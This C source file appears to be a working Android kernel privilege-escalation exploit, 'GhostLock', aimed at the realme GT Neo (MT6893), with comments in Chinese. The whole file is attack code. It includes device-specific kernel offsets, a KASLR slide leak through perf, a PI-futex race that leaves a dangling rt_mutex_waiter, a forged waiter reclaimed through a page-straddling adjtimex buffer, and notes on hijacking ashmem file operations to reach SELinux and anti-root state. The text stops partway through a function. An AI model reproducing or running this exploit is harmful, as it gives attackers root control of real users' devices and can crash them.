/* ============================================================================
 * GhostLock (CVE-2026-43499) —RMX3031 / realme GT Neo (MT6893)  Stage-1 提权
 *  移植自 RMX1991 (realme X2 / SM6150) 的已验证 stage1.c；
 *  全部设备相关偏移已从 RMX3031 的 vmlinux.elf 反汇编/重定位表实测替换，
 *  栈几何 (waiter 深度 0x190 / 缓冲 0x1a8 / waiter_off 0x18) 经反汇编确认一致。
 *
 * 目标(仅此一件事): 证明最小闭环成立 *   1) PI-futex 死锁舞步造出悬垂 task->pi_blocked_on   (waiter 线程)
 *   2) 32 位adjtimex() -> compat_get_timex 的栈缓冲把伪造rt_mutex_waiter
 *      精确盖回那个悬垂地址      (waiter_off = 0x18, 缓冲 0x80)
 *   3) 消费者线程sched_setattr 触发 rt_mutex_adjust_prio_chain
 *   4) rt_mutex_dequeue(lock, waiter) 的rb_erase 完成一次受控写
 *
 * 为什么必须32 位
 *   本机 futex_wait_requeue_pi 被内联进 do_futex, waiter 深度只有 0x190,
 *   而所有64 位可用的逐字节直拷栈缓冲都在 0x1b8..0x300(太深)或被 capable 挡住。 *   唯一落在窗口内的是compat_get_timex (32 位 的tx32 @ sp+8 -> 深度 0x1a8。 *   触FINDINGS.md 第七轮K2/K3。 *
 * 靶点: inet6_protos[IPPROTO_UDP]  (neighbours 16/18/19 全NULL, 形状约束满足)
 *   写操作 *(target) = value ; 随后 *(value) = word0(=0)
 *   验证: 默认 --value 指向 inet6_protos[19](全0), 于是发包时handler==NULL
 *         -> 确定性NULL 调用(内核 oops/panic) = 写原语确实生效的铁证。 *
 * 用法:
 *   ./stage1 --slide 0x...            # 指定 KASLR slide
 *   ./stage1                          # 尝试用perf_event_open 自动泄露 slide
 *   ./stage1 --dry                    # 只跑竞态 不发 UDP 区不触发oops)
 *   ./stage1 --iters 200000 --nice-lo 1 --nice-hi 19
 * ==========================================================================*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <dirent.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/futex.h>
#include <linux/perf_event.h>

/* ---------------------------------------------------------------- 符号偏移 */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL

/* 入口锚点 (用于 perf callchain 投票求slide) */
#define OFF_EL0_SYNC        0x000036c0ULL
#define OFF_RET_TO_USER     0x00003e34ULL
#define OFF_EL0_SVC         0x00003f80ULL
/* 攻击目标 */
#define OFF_INET6_PROTOS    0x01e49b80ULL
#define OFF_INIT_TASK       0x01e4c000ULL
#define OFF_SYSCTL_PERF_PARANOID 0x01e3e17cULL  /* ★用户态可读的 oracle 内核变量 */
#define OFF_SYSCTL_NET_BUSY_READ 0x01e3fc48ULL  /* ★★ 第二十九轮新 oracle:
                                                 * sysctl_net_busy_read  @+0  (默认 0, 可读)
                                                 * sysctl_net_busy_poll  @+4  (默认 0, 可读)
                                                 * 相邻两个 int 都为 0 => 这8 字节一0,
                                                 * 正好满足 enqueue 写原语「落点须先为 0」的要求;
                                                 * 写入 R 后读回= (int32)low32(R) / (int32)high32(R). */

#define IPPROTO_UDP_IDX     17

/* ★★ 第三十五轮新增 ashmem / 可root 防护 / 读重定向 相关常量 */
#define OFF_BUSY_READ_CTL_ENTRY  0x02087660ULL  /* RMX3031: handler=proc_dointvec_minmax @+0x20, clamp! */
#define OFF_PROC_DOINTVEC     0x0003c308ULL  /* 明文 proc_dointvec (无clamp); ffffff80080bc308 - BASE */  /* sysctl_net_busy_read 的ctl_table 条目; data 在+0x08 */
#define OFF_ASHEMEM_FOPS    0x13c2c38ULL   /* 真ashmem_fops (伪表用完立刻还原回去) */
#define OFF_ASHEMEM_LLSEEK  0x01fa6dcULL   /* ashmem_llseek (伪表被store1 砸坏的槽要修回 */
#define OFF_G_BOOT_STATE    0x17bc458ULL   /* is_unlocked() 读的全局; ==1 时反 root 防护直接放行 */
#define OFF_SELINUX_STATE   0x231d4f8ULL   /* struct selinux_state; enforcing 字节地+0 成+1 */
#define OFF_KIMAGE_VOFFSET  0x0000000ULL   /* u64: 内核镜像 VA<->PA 的差值(arm64) */
#define OFF_MEMSTART_ADDR   0x0000000ULL   /* phys_addr_t: RAM 起始物理地址 */
#define PAGE_OFFSET_39      0xFFFFFFC000000000ULL  /* ★VA_BITS=39 的PAGE_OFFSET:
                                                      *   本机 linear region 在地址空间【顶端。
                                                      *   已用 cred VA→pa 反算验证(触ZI11) */

#define PROTO_ENTRY(i)      (KIMAGE_TEXT_BASE + OFF_INET6_PROTOS + (uint64_t)(i) * 8)
#define INET6_TARGET        PROTO_ENTRY(IPPROTO_UDP_IDX)     /* 被改写槽 */
#define INET6_LOCK          (INET6_TARGET - 8)               /* fake rt_mutex 基址 */
#define INET6_VALUE         PROTO_ENTRY(19)                  /* 写进去的指针(全槽 */

/* ------------------------------------------------------- reclaim 缓冲几何 */
/* compat_get_timex 的tx32 在sp+8, 所属帧链0x100+0xb0=0x1b0
 * -> 缓冲基址深度 0x1a8 ; waiter 基址深度 0x190
 * -> 缓冲内偏移= 0x1a8 - 0x190 = 0x18
 */
#define RECLAIM_BUF_SIZE    128      /* sizeof(struct compat_timex) */
#define WAITER_OFF          0x18
#define W(i)                (WAITER_OFF + (i) * 8)

/* ---------------------------------------------- rt_mutex_waiter 字段(4.14) */
#define WAITER_TREE_ENTRY        0   /* rb_node: parent_color / right / left */
#define WAITER_PI_TREE_ENTRY     3
#define WAITER_TASK              6
#define WAITER_LOCK              7

/* ---------------------------------------------------- 栈几何常数反汇编实测 */
/* do_futex : T -> SyS/compat_SyS_futex 的入可sp ;  &rt_waiter = T - 0x190
 * compat_sys_adjtimex : frame 0x100  -> sp = T-0x100
 * compat_get_timex    : frame 0x0b0  -> sp = T-0x1b0 , 缓冲区在 sp+8 (深度 T-0x1a8)  */
#define DEPTH_RT_WAITER        0x190ULL
/* 内核栈顶到compat_SyS_* 入口 sp 的固定偏移由首次成功样本标定
 *   T=0xffffff800de4bec0 -> stack_top=0xffffff800de4c000 => 0x140 ) */
#define ENTRY_DELTA            0x140ULL
#define FRAME_COMPAT_ADJTIMEX  0x100ULL
#define FRAME_COMPAT_GET_TIMEX 0x1b0ULL
#define DEPTH_RECLAIM_BUF      0x1a8ULL
#define OFF_COMPAT_SYS_ADJTIMEX 0x0d7f5cULL
#define OFF_COMPAT_GET_TIMEX    0x1020f8ULL
#define LEN_COMPAT_SYS_ADJTIMEX 0x00007cULL   /* 实测: sub sp,#0x100 @+0x00, ret @+0x74, 本@+0x80 */
#define LEN_COMPAT_GET_TIMEX    0x0001a0ULL   /* ★第十九轮根因: 原值0x148 过长, 会吃这                                               * 下一个函数0x1068d4)的样本 把T 算偏 +0xb0 */
#define OFF_COMPAT_PUT_TIMEX    0x1022a0ULL
#define LEN_EL0_SVC             0x00000040ULL
/* ★T 的三种独立校验均由反汇编取真值:
 *   样本地el0_svc+0x14        : sp                 == T
 *   样本地compat_sys_adjtimex : sp + 0x100         == T   (常0x100)
 *   样本地compat_get_timex    : sp + 0x1b0         == T   (常0xb0, 内层; tx32 = sp+8)
 *   核16KB 对齐 ⇒T = ((sp+0x3FFF)&~0x3FFF) - ENTRY_DELTA(0x140) */
#define T_CONFIRM_MIN 1

/* ============ 第三十四轮 会file_operations 表劫持(缺口②闭合 ============ */
/* 目标: 用写原语把ashmem_misc.fops 改成我们控制的伪 fops 行F。 * 表内 .read/.write 指向【本机的 configfs 二进制属性接口。 它们尾部就是
 *     simple_read_from_buffer (buf,count,ppos, buffer->bin_buffer@0x50, size@0x58)
 *     simple_write_to_buffer(buffer->bin_buffer@0x50, size@0x58, ppos, buf, count)
 * 者buffer = filp->private_data, 由伪表.open=ashmem_open 造成一个ashmem_area;
 * ashmem_area.name 本267 字节且可被ASHMEM_SET_NAME 任意改写(走strcpy, 尾部不动)
 * => bin_buffer/bin_buffer_size 落在 name 内=> 【任意内核地址读写】。 * 无需任何额外的受控内核内存。完整证据 FINDINGS.md 第三十四轮ZH1-ZH13。*/
#define OFF_ASHEMEM_MISC_FOPS        0x02063ef8ULL  /* ashmem_misc + 0x10 (fops 字段) */
#define OFF_ASHEMEM_OPEN             0x00d7e864ULL
#define OFF_ASHEMEM_IOCTL            0x00d7ddd4ULL
#define OFF_COMPAT_ASHEMEM_IOCTL     0x00d7e6b0ULL
#define OFF_ASHEMEM_MMAP             0x00d7e6fcULL
#define OFF_ASHEMEM_RELEASE          0x00d7e8e4ULL
#define OFF_CONFIGFS_READ_BIN_FILE   0x02a3630ULL
#define OFF_CONFIGFS_WRITE_BIN_FILE  0x02a37b0ULL
/* struct configfs_buffer 字段偏移 (用configfs_*_bin_file 反汇编实测 */
#define CFG_MUTEX_OFF                0x20
#define CFG_NEEDS_READ_FILL_OFF      0x48   /* 8 字节写可同时清零 0x48/0x4c/0x4d */
#define CFG_BIN_BUFFER_OFF           0x50
#define CFG_BIN_BUFFER_SIZE_OFF      0x58   /* 8 字节写可同时清零 0x5c(cb_max_size) */
#define ASHMEM_PREFIX_LEN            11
#define ASHMEM_SET_NAME              0x41007701UL   /* _IOW(0x77,1,char[256]) */
/* stack_fds = T - (0xa0 + 0x1c0) + 0x50 = T - 0x210 ; in|out|ex 后40 字节 */
#define DEPTH_STACK_FDS              0x210ULL
#define PSELECT_NFDS                 320
#define FDSET_BYTES_320              40
#define FOPS_TABLE_SIZE              0x78
/* 伪表写入的值F 必须是4 字节对齐(内核会做 parent = pc & ~3) */

#define PERF_REG_ARM64_X29 29
#define PERF_REG_ARM64_SP  31
#define PERF_REG_ARM64_PC  32

static uint64_t g_slide = 0;
static uint64_t g_T = 0;      /* waiter 线程的内核栈顶入口 sp) */
static uint64_t g_R = 0;      /* &rt_waiter = g_T - 0x190  →受控缓冲的地址 */
static int opt_aw_udp = 0;    /* --aw-udp: 用perf 得到的R 构造任意写, 靶点 inet6_protos[17] */
static int opt_aw_nowrite = 0;/* --aw-nowrite: 对照实验, 把pi_tree_entry 设成 RB_EMPTY 跳过那次写*/

/* ------------------------------------------------------------- 全局竞态性*/
static volatile int f_wait;         /* 普通futex: waiter 在此等待 */
static volatile int f_pi_target;    /* PI futex: owner 持锁, requeue 目标 */
static volatile int f_pi_chain;     /* PI futex: waiter 持锁, owner 阻塞于此 */

static volatile int waiter_ready, waiter_waiting, waiter_tid;
/* ★★★ ZT53: owner 线程摘除开关 (由 waiter 线程执行 UNLOCK_PI) —— 必须声明在
 * waiter_thread 之前, 所以放在这里而不是偏移常量区. */
static volatile int pi_unlock_go, pi_unlock_done, pi_unlock_rc, pi_unlock_errno;
static volatile int owner_started, owner_chain_done;
static volatile int route_done;
static volatile int waiter_out;      /* waiter 已从 FUTEX_WAIT_REQUEUE_PI 返回 */
static volatile int reclaim_stop;    /* 设waiter 停止重铺缓冲 */
static volatile long g_adj_ret, g_adj_err, g_adj_n;  /* ★第二十四轮 adjtimex 返回值诊断预期 -1/EFAULT) */
static volatile int consumer_done;   /* ★第二十六轮 消费者阶段结来——waiter 在此之前【不得进内核。*/
static volatile int consume_go, consume_stop;
static volatile int consume_pre;      /* ★消费者进 syscall 之前置位: 区分"没跑到一卡在内核" */
static volatile long consume_calls;
static volatile long consume_ok, consume_err;

static uint8_t reclaim_buf[RECLAIM_BUF_SIZE] __attribute__((aligned(8)));

/* ★★★★★第二十四轮关键改动 跨页 utp
 * 根因(已反汇编确认): compat_SyS_adjtimex 在compat_get_timex 铺好 tx32(=T-0x1a8, 覆盖 W)
 *   之后, 会继续调用do_adjtimex ——者do_adjtimex 的调用链深达 0x290, 其中
 *   ntp_validate_timex(常0x20 @深度 0x190) 恰好覆盖 [T-0x190, T-0x170] = W 的头 0x20 字节。 *   ⇒每一次adjtimex 都把自己刚铺好的偏waiter 踩掉 ⇒命中率恒为0。 *
 * 破解(已反汇编确认): compat_SyS_adjtimex 里有一条分支 *       dde68  bl  compat_get_timex
 *       dde6c  cbnz w0, 0x815de90        <-- 非0 就跳过do_adjtimex 直接返回
 *   者compat_get_timex 的故障路径【只把未拷贝的尾部补零。 已拷贝的前缀原样保留, 返回 -EFAULT。 *   ⇒让用户struct compat_timex 跨在页边界上, 拷满 0x78 字节后fault,
 *     到W(缓冲偏移 [0x18,0x68)) 已被完整拷贝, 不do_adjtimex 根本不执行 *     ⇒W 完整保留在R 不 系统调用里只剩帧 0x100 的compat_SyS_adjtimex(在W 之上)。*/
#define STRADDLE_FILL 0x78    /* 必须 >= 0x68: W = 缓冲偏移 [0x18, 0x68) */
static uint8_t *g_utp = NULL;            /* 传给 adjtimex 的跨页指针*/
static uint8_t *g_buf = reclaim_buf;     /* 构造器实际写入的位置*/
static int opt_straddle = 1;             /* --nostraddle 关闭(A/B 对照) */
static int opt_keep_relay = 0;           /* ★默认: 消费者结束后停掉重铺风暴(--keep-relay 保持) */
static int opt_enq = 0;                  /* ★★ 第二十九轮 用enqueue(rb_insert) 而不是erase 当写原语 */
static int opt_aw_busy = 0;              /* ★★ 靶点 = sysctl_net_busy_read (新oracle) */
static uint64_t g_init_task, g_inet6_target, g_inet6_lock, g_inet6_value;
static int opt_iters = 2000000;
static int opt_wait_ms = 1000;   /* FUTEX_WAIT_REQUEUE_PI 超时(ms): 必须 > 主线程发 requeue 的时刻*/
static int opt_nice_lo = 1, opt_nice_hi = 19;
static int opt_dry = 0;
static int opt_pin = 1;
static int opt_value_zero = 1;   /* 默认: 内0 (NULL 形式) ——使后续enqueue 立即退出 无需受控内核页*/
static int opt_exit = 0;         /* 默认不退出 以排险PI-state 拆除导致的崩溃*/
static int opt_probe = 0;        /* --probe: 把target 放进一个用户页 (PAN 判定实验) */
static int opt_leak_only = 0;    /* --leak-only: 只做 perf 泄露, 不开消费者不崩设备) */
static uint64_t opt_target_addr = 0;  /* --target 0x... 显式指定写目标*/
static uint64_t opt_v_addr = 0;       /* --v 0x... 显式指定写值V */
static uint64_t opt_T_addr = 0;       /* ★--T 0x... 手工指定 T (跳过 perf 泄露, 用于复现) */
static int opt_oneshot = 0;           /* ★--oneshot: 消费者只放行一发sched_setattr */
static int opt_force_consume = 0;     /* ★--force-consume: T 未确认也开消费者调试用 危险) */
static int opt_aw_pp = 0;             /* ★--aw-pp: 靶点换成 sysctl_perf_event_paranoid(用户态可读oracle) */
static int opt_trace = 0;             /* ★--trace: 用perf 采样消费者线程的内核 PC/调用链定位卡死点 */
static volatile int consumer_tid = 0;
static uint8_t *probe_page = NULL;

/* ★RMX3031 移植诊断: fsync 阶段标记, 崩溃重启后仍可读 */
static void mark_stage(const char *s) {
    int fd = open("/data/local/tmp/gl_stage.mark", O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (fd >= 0) { write(fd, s, strlen(s)); write(fd, "\n", 1); fsync(fd); close(fd); }
}

/* --------------------------------------------------------------- 小工全*/
static long do_futex(volatile int *uaddr, int op, int val,                     struct timespec *to, volatile int *uaddr2, int val3) {
    return syscall(__NR_futex, (void *)uaddr, op, val, to, (void *)uaddr2, val3);
}

static void pin_cpu(int cpu) {
    if (!opt_pin || cpu < 0) return;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);
}

/* ----------------------------------------------------------------- perf */
struct perf_attr_min {           /* 只用到的字段, 保证布局正确 */
    struct perf_event_attr a;
};

/* 用perf_event_open + callchain 泄露内核地址, 通过"锚点投票"求slide.
 * 返回 0 成功. 依赖 perf_event_paranoid <= 1 (本机 = -1)。*/
static int perf_leak_slide(uint64_t *out_slide) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period = 1000;
    pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    pe.sample_max_stack = 32;
    pe.disabled = 1;
    pe.exclude_user = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_callchain_user = 1;
    pe.wakeup_events = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0UL);
    if (fd < 0) {
        fprintf(stderr, "[!] perf_event_open 失败: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }
    size_t pg = (size_t)sysconf(_SC_PAGESIZE);
    size_t map_sz = pg * 9;
    void *map = mmap(NULL, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { close(fd); return -1; }
    struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)map;
    uint8_t *data = (uint8_t *)map + pg;
    size_t data_sz = map_sz - pg;

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    /* 制造一些内核活动以便采样*/
    for (int i = 0; i < 20000; i++) syscall(__NR_getpid);

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    static const uint64_t anchors[] = { OFF_EL0_SVC, OFF_EL0_SYNC, OFF_RET_TO_USER };
    const int nanch = (int)(sizeof(anchors) / sizeof(anchors[0]));
    static uint64_t cands[4096];
    static int votes[4096];
    int ncand = 0;

    uint64_t head = meta->data_head;
    __sync_synchronize();
    uint64_t tail = meta->data_tail;
    int samples = 0;
    while (tail < head && samples < 4000) {
        struct perf_event_header *h = (struct perf_event_header *)(data + (tail % data_sz));
        if (h->size == 0) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)h + sizeof(*h);
            uint64_t ip = *(uint64_t *)p; p += 8;
            uint64_t nr = *(uint64_t *)p; p += 8;
            uint64_t *ips = (uint64_t *)p;
            samples++;
            /* 用callchain 的每一帧对每个锚点投票 */
            for (uint64_t k = 0; k < nr && k < 32; k++) {
                uint64_t v = ips[k];
                if (v < 0xffffff8000000000ULL) continue;   /* 只要内核地址 */
                for (int a = 0; a < nanch; a++) {
                    uint64_t slide = v - (KIMAGE_TEXT_BASE + anchors[a]);
                    if (slide > 0x400000000ULL) continue;       /* 合理上限 */
                    if (slide & 0xfff) continue;                /* 必须页对齐*/
                    int found = -1;
                    for (int c = 0; c < ncand; c++) if (cands[c] == slide) { found = c; break; }
                    if (found < 0) {
                        if (ncand >= 4096) continue;
                        cands[ncand] = slide; votes[ncand] = 1; ncand++;
                    } else votes[found]++;
                }
            }
            (void)ip;
        }
        tail += h->size;
    }
    meta->data_tail = head;
    munmap(map, map_sz);
    close(fd);

    int best = -1;
    for (int c = 0; c < ncand; c++) if (best < 0 || votes[c] > votes[best]) best = c;
    if (best < 0 || votes[best] < 3) {
        fprintf(stderr, "[!] slide 投票失败 (samples=%d cands=%d best_votes=%d)\n",
                samples, ncand, best < 0 ? -1 : votes[best]);
        return -1;
    }
    *out_slide = cands[best];
    fprintf(stderr, "[*] slide = 0x%llx (votes=%d/%d, samples=%d)\n",
            (unsigned long long)*out_slide, votes[best], samples, samples);
    return 0;
}

/* --------------------------------------------------------------- 三个角色 */
static long read_sysctl_int(const char *path);   /* ★前向声明: 消费者线程要【即时】读 oracle */

static void *waiter_thread(void *arg) {
    (void)arg;
    pin_cpu(1);
    waiter_tid = (int)syscall(__NR_gettid);

    /* 1) waiter 先持有chain */
    if (do_futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        fprintf(stderr, "[!] waiter LOCK_PI(chain) errno=%d\n", errno);

    waiter_ready = 1;
    while (!owner_started) usleep(1000);

    /* 2) 阻塞在FUTEX_WAIT_REQUEUE_PI(wait -> target)   →rt_waiter 落在此栈
     *    ★超时给短一点默认 200ms): 必须让本线程**尽快返回**,
     *      否则消费者在我们铺好缓冲之前就把链走跑光了会被用在"活的rt_waiter 不。*/
    struct timespec to;
    clock_gettime(CLOCK_MONOTONIC, &to);
    to.tv_nsec += (long)opt_wait_ms * 1000000L;
    while (to.tv_nsec >= 1000000000L) { to.tv_sec++; to.tv_nsec -= 1000000000L; }
    waiter_waiting = 1;
    long r = do_futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &to, &f_pi_target, 0);
    (void)r;

    /* 3) 关键一步 用32 位adjtimex() 把伪造waiter 盖回悬垂地址。     *    先屏蔽全部信号避免信号投递破坏栈), 再宣命已返回, 然后持续重铺。*/
    signal(SIGSEGV, SIG_IGN);
    sigset_t all;
    sigfillset(&all);
    pthread_sigmask(SIG_BLOCK, &all, NULL);

    waiter_out = 1;

    /* 一直重铺 直到主线程说做——保证消费者打的时候缓冲一定在位*/
    for (;;) {
        errno = 0;
        long ar = syscall(__NR_adjtimex, g_utp);  /* ★跨页指针: 预期 -1/EFAULT => 跳过 do_adjtimex */
        int ae = errno;
        g_adj_ret = ar; g_adj_err = ae; g_adj_n++;
        if (g_adj_n == 1) {
            fprintf(stderr, "[*] waiter 第次adjtimex(utp) -> %ld (errno=%d)  ★期待-1/EFAULT(=%d)\n",
                    ar, ae, EFAULT);
            mark_stage("S2b-waiter-first-adjtimex");
        }
        if (reclaim_stop) break;
    }
    route_done = 1;

    /* 4) 收尾 ——★★ 第二十六轮关键 停掉重铺之后【必须先进纯用户态自旋】。     *    原因: W 就在本线程内核栈上 只要本线程再进一次内核哪怕只是usleep),
     *    压下的帧就会覆盖 W, 链走读到的假 waiter 立刻失效。     *    只有在【消费者已经打完】之后 才允许进内核休眠以免烘CPU。*/
    while (!owner_chain_done && !consumer_done) { /* busy spin, 不进内核 */ }
    for (;;) {
        if (owner_chain_done) break;
        /* ★★★ ZT53: 在进程【存活时】把 owner 线程从被破坏的 PI 链上干净摘下来.
         * 内核认为 chain 的 owner 就是本线程 (waiter), 所以只有本线程的 UNLOCK_PI 有效.
         * 一旦 owner 正常返回, 退出时就不会再走 futex_lock_pi -> rt_mutex_cleanup_proxy_lock
         * -> remove_waiter -> rt_mutex_adjust_prio_chain 那条会打转的路径 (ramoops 实证). */
        if (pi_unlock_go && !pi_unlock_done) {
            errno = 0;
            pi_unlock_rc = (int)do_futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            pi_unlock_errno = errno;
            pi_unlock_done = 1;
            fprintf(stderr, "[*] ZT53 piunlock: FUTEX_UNLOCK_PI(chain) -> %d errno=%d\n",
                    pi_unlock_rc, pi_unlock_errno);
        }
        usleep(20000);
    }
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    pin_cpu(2);
    /* owner 先持有target */
    if (do_futex(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        fprintf(stderr, "[!] owner LOCK_PI(target) errno=%d\n", errno);
    while (!waiter_ready) usleep(1000);
    owner_started = 1;
    /* owner 再去把chain -> 阻塞(waiter 持锁) => 形成 waiter->target->owner->chain->waiter 现*/
    do_futex(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    owner_chain_done = 1;
    for (;;) sleep(1);
    return NULL;
}

/* 消费者 反复 sched_setattr(waiter_tid, nice) 触发 rt_mutex_adjust_prio_chain */
struct sched_attr_min {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

static void *consumer_thread(void *arg) {
    (void)arg;
    pin_cpu(0);
    consumer_tid = (int)syscall(__NR_gettid);   /* ★侧--trace 采样 */
    long n = 0, ok = 0, err = 0, first_ret = 0;
    int first_errno = 0;
    while (!consume_stop) {
        if (!consume_go) { usleep(100); continue; }
        int tid = waiter_tid;
        if (!tid) { usleep(100); continue; }
        struct sched_attr_min a;
        memset(&a, 0, sizeof(a));
        a.size = 48;                      /* SCHED_ATTR_SIZE_VER0 */
        a.sched_policy = SCHED_NORMAL;
        int span = opt_nice_hi - opt_nice_lo + 1;
        a.sched_nice = opt_nice_lo + (int)(n % (span > 0 ? span : 1));
        errno = 0;
        consume_pre = 1;          /* ★进内核之前置位——若卡死 主线程据此判定确实进了 syscall" */
        if (n == 0) fprintf(stderr, "[*] consumer: >> 第1 可sched_setattr(tid=%d nice=%d) 即将进入内核\n", tid, a.sched_nice);
        long r = syscall(__NR_sched_setattr, tid, &a, 0);
        if (n == 0) fprintf(stderr, "[*] consumer: << 第1 发已返回 r=%ld errno=%d\n", r, errno);
        if (n == 0) {
            /* ★★ 第二十九轮关键 第一发返回后【立刻】读 oracle。             *    若随后内核崩/rebase, 事后读文件会被截断=> 这一行是唯一能保住答案的地方。*/
            long ba = read_sysctl_int("/proc/sys/net/core/busy_read");
            long bp = read_sysctl_int("/proc/sys/net/core/busy_poll");
            long pp = read_sysctl_int("/proc/sys/kernel/perf_event_paranoid");
            fprintf(stderr, "[*] consumer: [即时 oracle] busy_read=%ld busy_poll=%ld perf_paranoid=%ld\n",
                    ba, bp, pp);
        }
        if (r == 0) ok++;
        else { err++; if (!first_errno) { first_errno = errno; first_ret = r; } }
        consume_calls = ++n;
        consume_ok = ok;
        consume_err = err;
        if (opt_oneshot) { consume_go = 0; break; }   /* ★只放行一发*/
    }
    fprintf(stderr, "[*] consumer: calls=%ld ok=%ld err=%ld first_ret=%ld first_errno=%d\n",
            n, ok, err, first_ret, first_errno);
    return NULL;
}

/* ---------------------------------------------- 跨页 utp 的建立第二十四轮 */
/* 们g_utp 指向 "第一页末尾往前STRADDLE_FILL 字节" 备
 *   g_utp[0 .. STRADDLE_FILL)   已映射  <- 会被 copy_from_user 真实拷走
 *   g_utp[STRADDLE_FILL .. 0x80) 未映射 <- 触发 fault => -EFAULT => 跳过 do_adjtimex
 * 注意 access_ok 只做 "addr+size <= TASK_SIZE" 的范围检查 【不查页表。
 * 所以跨到未映射页不会被 access_ok 提前挡掉(反汇编里那条 cbz x11 -> 全缓冲补零的分支不会走到。*/
static int setup_straddle(void) {
    long pg = sysconf(_SC_PAGESIZE);
    uint8_t *base = mmap(NULL, (size_t)pg * 2, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (base == MAP_FAILED) { perror("mmap straddle"); return -1; }
    if (munmap(base + pg, (size_t)pg) != 0) { perror("munmap straddle 2nd page"); return -1; }
    g_utp = base + pg - STRADDLE_FILL;
    g_buf = g_utp;
    memset(g_utp, 0, STRADDLE_FILL);
    fprintf(stderr,
            "[*] 跨页 utp: 基址=0x%llx  已映射[0,0x%x)  未映射[0x%x,0x80)\n"
            "[*]   => compat_get_timex 的copy_from_user 将在偏移 0x%x 备fault -> -EFAULT\n"
            "[*]   => compat_SyS_adjtimex 走cbnz w0 分支, 【跳过do_adjtimex。> W 不被覆盖\n",
            (unsigned long long)(uintptr_t)base, STRADDLE_FILL, STRADDLE_FILL, STRADDLE_FILL);
    return 0;
}

/* --------------------------------------------------------------- 构造缓冲*/
static void build_reclaim_buf(uint64_t task, uint64_t lock, uint64_t value) {
    memset(g_buf, 0, STRADDLE_FILL);          /* ★只清到STRADDLE_FILL(跨页时再往后会 SIGSEGV) */
    /* modes(offset 0..3) = 0 -> do_adjtimex 不会改系统时间*/
    uint64_t *w = (uint64_t *)(g_buf + WAITER_OFF);
    w[WAITER_TREE_ENTRY + 0] = 0;                 /* __rb_parent_color=0 -> parent NULL */
    w[WAITER_TREE_ENTRY + 1] = value;             /* rb_right -> 被提升进 root 的child(=写入值 */
    w[WAITER_TREE_ENTRY + 2] = 0;                 /* rb_left=0 -> 走rb_erase 的case 1 */
    w[WAITER_PI_TREE_ENTRY + 0] = 0;              /* pi_tree pc=0 -> 非RB_EMPTY */
    w[WAITER_PI_TREE_ENTRY + 1] = 0;              /* pi rb_right=0 */
    w[WAITER_PI_TREE_ENTRY + 2] = 0;              /* pi rb_left=0 -> 对init_task.pi_waiters 无害 NULL 内*/
    w[WAITER_TASK] = task;                        /* &init_task */
    w[WAITER_LOCK] = lock;                        /* target - 8 */
    fprintf(stderr, "[*] reclaim buf: waiter_off=0x%x task=0x%llx lock=0x%llx value=0x%llx\n",
            WAITER_OFF, (unsigned long long)task, (unsigned long long)lock,
            (unsigned long long)value);
}

/* --------------------------------------------------------------- UDP 触发 */
static int fire_udp(void) {
    int s = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (s < 0) { perror("socket(AF_INET6)"); return -1; }
    struct sockaddr_in6 dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin6_family = AF_INET6;
    dst.sin6_port = htons(31337);
    inet_pton(AF_INET6, "::1", &dst.sin6_addr);
    const char *msg = "ghostlock";
    ssize_t n = sendto(s, msg, strlen(msg), 0, (struct sockaddr *)&dst, sizeof(dst));
    fprintf(stderr, "[*] sendto(::1:31337) -> %zd (%s)\n", n, n < 0 ? strerror(errno) : "ok");
    close(s);
    return (int)n;
}

/* ------------------------------------------ perf 泄露指定线程的内核栈顶T */
/* 原理: PERF_SAMPLE_REGS_INTR 给的是【中断时刻的内核 pt_regs。 于是 sp 就是内核栈指针。 * 采样目标线程, 真pc 落在哪个已知函数重
 *   pc −compat_sys_adjtimex  -> sp 必等于该函数帧底 = T - 0x100  => T = sp + 0x100
 *   pc −compat_get_timex     -> sp 必等于该函数帧底 = T - 0x1b0  => T = sp + 0x1b0
 * (arm64 帧指针固定 函数体内的sp 在整个函数里是常数 */
static int perf_leak_T(int tid, uint64_t *out_T) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
